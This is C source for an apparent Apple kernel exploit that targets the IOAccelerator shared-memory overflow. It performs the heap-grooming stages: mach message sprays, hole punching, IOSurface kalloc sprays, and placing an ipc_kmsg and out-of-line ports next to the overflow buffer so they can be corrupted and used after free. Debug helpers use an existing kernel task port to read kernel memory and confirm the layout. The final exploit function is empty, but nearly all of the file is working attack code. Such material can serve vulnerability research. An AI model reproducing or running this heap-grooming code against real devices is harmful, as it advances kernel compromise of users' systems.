#include <stdio.h>

#include "print.h"
#include "ioaccel.h"
#include "iosurface.h"
#include "exploit_utilities.h"
#include "exploit.h"

#define ENABLE_HELPER 1

#if ENABLE_HELPER
#include "helper/krw.h"
#include "helper/offsets.h"
#include "helper/kexecute.h"
#include "helper/find_port.h"
#include "helper/find_shmem.h"
#include "helper/find_IOSurface.h"
#include "helper/translations.h"
#endif

extern mach_port_t tfp0;

// Kernel Page Size.
extern mach_vm_size_t pagesize;

int exploit(void) {

	return 0;
}



int main(int argc, char *argv[], char *envp[]) {
    int ret = 0;

	IOAccelerator_init();
	IOSurface_init();

#if ENABLE_HELPER
    offsets_init();
	init_tfp0(); 
	INFO("tfp0: 0x%" PRIx32 "\n", tfp0);

	int r = get_kbase(&kbase);
    INFO("get_kbase ret: %d, kbase: 0x%llx, kslide: 0x%llx\n", r, kbase, kslide);
    init_kexecute();
#endif

    void *data = NULL;
	mach_port_t ports[port_cnt] = {};

	// setup 200 ports for later use
    for (int i = 0; i < port_cnt; i++) {
        ports[i] = new_mach_port();
		// INFO("got new_mach_port[%d]: 0x%x\n", i, ports[i]);
    }

	int port_i = 0;
#define POP_PORT() ports[port_i++]

// ----------- heap pre-exploit setup ----------- //
    INFO("Doing stage 0 heap setup\n");

	// fill kalloc_map so new allocations are always done in kernel_map (where our buffer that will get overflowed is)
    mach_port_t saved_ports[10];
    mach_msg_size_t msg_size = message_size_for_kalloc_size(7 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    size_t stage0_sz = pagesize == 0x4000 ? 10 MB : 5 MB;
    for (int i = 0; i < 10; i++) {
        saved_ports[i] = POP_PORT();

        #if ENABLE_HELPER
        //helper; set signature
        if((i % 2) == 0) {memset(data, 0x74, msg_size);}
        else {memset(data, 0x72, msg_size);}
        #endif

        for (int j = 0; j < stage0_sz / (7 * pagesize); j++) {
            
            kern_return_t ret = send_message(saved_ports[i], data, msg_size);
            
            if (ret) {
                ERROR("Failed to send message\n");
                goto err;
            }
        }

        #if ENABLE_HELPER
        //helper; obtain msgdata_kptr
        uint64_t kmsgdata_kptr = find_kmsgdata_from_port(saved_ports[i]);
        INFO("saved_ports[%d](port=0x%x)'s msgdata_kptr = 0x%llx\n", i, saved_ports[i], kmsgdata_kptr);
        #endif
    }
    
    
    free(data);
    data = NULL;

    // we'll never do allocations smaller than 8 pages, so create some 7 page holes so the system can do small allocations there and leave us in peace
    mach_port_destroy(mach_task_self(), saved_ports[0]);
    mach_port_destroy(mach_task_self(), saved_ports[2]);
    mach_port_destroy(mach_task_self(), saved_ports[4]);
    mach_port_destroy(mach_task_self(), saved_ports[5]);
    mach_port_destroy(mach_task_self(), saved_ports[7]);
    mach_port_destroy(mach_task_self(), saved_ports[9]);

    // make a bunch of 8 page allocations to ensure there are no holes that mess with our allocations
    mach_port_t spray = POP_PORT();
    msg_size = message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    
    #if ENABLE_HELPER
    //helper; set signature
    memset(data, 0x81, msg_size);
    #endif

    for (int i = 0; i < MACH_PORT_QLIMIT_LARGE; i++) {  //MACH_PORT_QLIMIT_LARGE = (1024)
        kern_return_t ret = send_message(spray, data, msg_size);
        if (ret) {
            printf("[-] Failed to send message\n");
            goto err;
        }
    }

    #if ENABLE_HELPER
    //helper; obtain msgdata_kptr 
    uint64_t kmsgdata_kptr = find_kmsgdata_from_port(spray);
    INFO("spray(port=0x%x)'s msgdata_kptr = 0x%llx\n", spray, kmsgdata_kptr);
    // getchar();
    //
    #endif

    // ----------- heap stage 1 setup -----------//
    
    INFO("Doing stage 1 heap setup\n");
    
    int property_index = 0;
    uint32_t huge_kalloc_key = transpose(property_index++);
    ret = IOSurface_empty_kalloc(82 MB, huge_kalloc_key);
    if (ret) {
        ERROR("Failed to allocate empty kalloc buffer (ret: 0x%x, %s)\n", ret, mach_error_string(ret));
        goto err;
    }

    #if ENABLE_HELPER
    //helper; find our sprayed IOSurface data
    uint64_t userspaceValueDicts = userdict_from_IOSurface();
	INFO("IOSurface's userspaceValueDicts: 0x%llx\n", userspaceValueDicts);
    struct kOSDict *dict = kernel_fetch_dict(userspaceValueDicts);
    uint64_t osdict_entry = 0;
    
    for (int i = 0; i < dict->count; i++) {
		if(dict->items[i].value) {
            uint32_t osdict_count = kread32(dict->items[i].value + 0x14);	// 0x14 = p/x offsetof(OSDictionary, count)
	        uint32_t osdict_capacity = kread32(dict->items[i].value + 0x18);	// 0x18 = p/x offsetof(OSDictionary, capacity)
            osdict_entry = kread64(dict->items[i].value + 0x20);	// 0x20 = p/x offsetof(OSDictionary, dictionary)

            if(osdict_capacity == (82 MB / 0x10)) {
                uint64_t osdictentry_key = kread64(osdict_entry + 0x0); // 0x0 = p/x offsetof(OSDictionary::dictEntry, key)
                uint64_t osdict_kbuffer = kread64(osdictentry_key + 0x10);  // 0x10 = p/x offsetof(OSString, string)
                
                if(kread32(osdict_kbuffer) == 0xaabbcc) {
                    SUCCESS("Found our sprayed IOSurface data!\n");
                    INFO("OSDict from userspaceValueDicts[%u] = 0x%llx\n", i, dict->items[i].value);
                    INFO("osdict_count = 0x%x, osdict_capacity = 0x%x, osdict_entry = 0x%llx\n", osdict_count, osdict_capacity, osdict_entry);
                    INFO("osdictentry_key = 0x%llx\n", osdictentry_key);
                    INFO("osdict_kbuffer = 0x%llx -> 0x%x\n", osdict_kbuffer, kread32(osdict_kbuffer));
                    break;
                }
            }
		}
    }
    // getchar();
    //
    #endif

    
    // setup the buffers that we'll overflow
    struct IOAccelDeviceShmemData cmdbuf, seglist;
    uint64_t command_buffer_shmem_sig = 0x4142434445464748;
	uint64_t segment_list_shmem_sig = 0x5152535455565758;
    ret = alloc_shmem_with_sig(96 MB, &cmdbuf, &seglist, command_buffer_shmem_sig, segment_list_shmem_sig);

    if (ret) {
        ERROR("Failed to allocate shared memory\n");
        goto err;
    }

    #if ENABLE_HELPER
    //helper; find our 96MB shmem data
    translation_init();
    uint64_t command_buffer_shmem_data_kva, segment_list_shmem_data_kva = 0;
	find_shmem_in_kernel_4(&command_buffer_shmem_data_kva, &segment_list_shmem_data_kva, command_buffer_shmem_sig, segment_list_shmem_sig, osdict_entry);
	SUCCESS("command_buffer_shmem_data_kva: 0x%llx\n", command_buffer_shmem_data_kva);
	SUCCESS("segment_list_shmem_data_kva: 0x%llx\n", segment_list_shmem_data_kva);
    //
    #endif

    // heap now:
    // ------------------+------------------+------------------+----------------
    //     huge kalloc   |   segment list   |  command buffer  |
    // ------------------+------------------+------------------+----------------
    //

    // port which we will later corrupt. should be exactly after command buffer
    mach_port_t corrupted_kmsg_port = POP_PORT();
    ret = send_message(corrupted_kmsg_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
    if (ret) {
        printf("[-] Failed to send message\n");
        goto err;
    }

    #if ENABLE_HELPER
    //helper; obtain struct ipc_kmsg's addr
    uint32_t off_ipc_port_ikmq_base = 0x40;
    uint64_t ikmq_base = kread64(find_port(corrupted_kmsg_port) + off_ipc_port_ikmq_base);
    INFO("struct ipc_kmsg(port=0x%x) = 0x%llx\n", corrupted_kmsg_port, ikmq_base);
    // getchar();
    //
    #endif

    // now:
    // ------------------+------------------+------------------+-----------------+-----------
    //     huge kalloc   |   segment list   |  command buffer  | struct ipc_kmsg |
    // ------------------+------------------+------------------+-----------------+-----------
    //



    // this is a placeholder, we need it allocated for now but later it'll be freed and allocated with controlled data which will be UAFd
    mach_port_t placeholder_message_port = POP_PORT();
    ret = send_message(placeholder_message_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
    if (ret) {
        printf("[-] Failed to send message\n");
        goto err;
    }

    #if ENABLE_HELPER
    //helper; obtain struct ipc_kmsg 2's addr
    ikmq_base = kread64(find_port(placeholder_message_port) + off_ipc_port_ikmq_base);
    INFO("struct ipc_kmsg 2(port=0x%x) = 0x%llx\n", placeholder_message_port, ikmq_base);
    // getchar();
    //
    #endif
    
    // allocate ool buffer which we'll also UAF
    mach_port_t ool_message_port = POP_PORT();
    int ool_ports_count = (7 * pagesize) / sizeof(uint64_t) + 1;
    ret = send_ool_ports(ool_message_port, MACH_PORT_NULL, ool_ports_count, MACH_MSG_TYPE_COPY_SEND);
    if (ret) {
        printf("[-] Failed to send ool ports message\n");
        goto err;
    }

    #if ENABLE_HELPER
    //helper; obtain ool ports addr
    kmsgdata_kptr = find_kmsgdata_from_port(ool_message_port);
    INFO("ool_message_port(port=0x%x)'s msgdata_kptr = 0x%llx\n", ool_message_port, kread64(kmsgdata_kptr+4));
    // khexdump(kread64(kmsgdata_kptr+4), 0x1000);
    // getchar();
    //
    #endif
    
    // now:
    // ------------------+------------------+------------------+-----------------+-------------------+-----------+
    //     huge kalloc   |   segment list   |  command buffer  | struct ipc_kmsg | struct ipc_kmsg 2 | ool ports |
    // ------------------+------------------+------------------+-----------------+-------------------+-----------+
    //



err:
	// clean 200 ports
	for (int i = 0; i < port_cnt; i++) {
        if (ports[i] /*&& ports[i] != new_tfp0*/) mach_port_destroy(mach_task_self(), ports[i]);
    }

    if (data) free(data);
	
    #if ENABLE_HELPER
    term_kexecute();    //helper
    mach_port_destroy(mach_task_self(), tfp0);
    #endif

	IOAccelerator_deinit();
	IOSurface_deinit();
	return 0;
}
